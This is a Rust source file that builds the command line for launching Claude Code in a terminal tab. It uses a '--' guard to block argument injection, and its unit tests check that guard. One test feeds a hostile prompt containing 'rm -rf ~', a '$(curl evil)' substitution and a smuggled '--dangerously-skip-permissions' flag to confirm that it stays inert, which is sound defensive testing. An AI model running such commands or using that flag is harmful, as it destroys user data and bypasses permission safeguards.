//! How an agent is run inside the new zellij tab. `ClaudeLauncher` is the only
//! impl today; codex slots in behind the same trait (PWF-0068).

use crate::engines::pending_work::{
    agent::query::get_thread_title,
    launch::{Worktree, new_launch_prompt},
    model::Item,
};

/// Builds the tab name and the argv that runs an agent in the new zellij tab.
pub(in crate::engines::pending_work) trait AgentLauncher {
    /// Name for the new tab (the canonical item id).
    fn tab_name(&self, item: &Item) -> String;
    /// argv after `zellij … new-tab … --`, e.g. `["claude","--name",<title>,"--",<prompt>]`.
    /// `worktree` augments the launch prompt with a git-worktree setup step.
    fn argv(&self, item: &Item, worktree: Worktree) -> Vec<String>;
}

/// Launches Claude Code with the item's launch prompt.
pub(in crate::engines::pending_work) struct ClaudeLauncher;

impl AgentLauncher for ClaudeLauncher {
    fn tab_name(&self, item: &Item) -> String {
        item.id.clone()
    }

    // TODO: refactor this, far too imperative and confusing to know that THIS is the thing that
    // names the session!
    fn argv(&self, item: &Item, worktree: Worktree) -> Vec<String> {
        let thread_title = get_thread_title::handle(item.into());
        vec![
            "claude".to_string(),
            "--name".to_string(),
            thread_title,
            // End-of-options guard: store-derived prompt can never be parsed as a
            // claude flag (argument injection), it is forced to a positional.
            "--".to_string(),
            new_launch_prompt(item, worktree),
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engines::pending_work::model::Item;

    #[test]
    fn claude_launcher_builds_named_argv_with_guard_and_prompt() {
        let item = Item {
            prompt: "do the thing".to_string(),
            ..Item::default_for_test("PWF-0038", "zellij dispatches")
        };
        let l = ClaudeLauncher;
        assert_eq!(l.tab_name(&item), "PWF-0038");
        let argv = l.argv(&item, Worktree::from(false));
        assert_eq!(argv[0], "claude");
        assert_eq!(argv[1], "--name");
        assert_eq!(argv[2], "PWF-0038 - zellij dispatches");
        // `--` end-of-options guard precedes the prompt.
        assert_eq!(argv[3], "--");
        assert!(argv[4].contains("do the thing"));
        assert_eq!(argv.len(), 5);
    }

    #[test]
    fn hostile_title_and_prompt_stay_inert_single_elements() {
        // Store data is arbitrary/hostile: it must never become a flag or split
        // across argv elements. argv[0] is fixed; the `--` guard caps options.
        let item = Item {
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
            ..Item::default_for_test("PWF-0073", "--dangerously-skip-permissions")
        };
        let argv = ClaudeLauncher.argv(&item, Worktree::from(false));
        assert_eq!(argv[0], "claude"); // store can't change WHAT runs
        assert_eq!(argv[3], "--"); // guard present
        // The hostile prompt is exactly one trailing element after the guard.
        assert_eq!(argv.len(), 5);
        assert!(argv[4].contains("rm -rf"));
        assert!(argv[4].contains("--dangerously-skip-permissions"));
        // The title rides as the single `--name` value (id-prefixed, never a flag).
        assert!(argv[2].starts_with("PWF-0073 - "));
    }
}
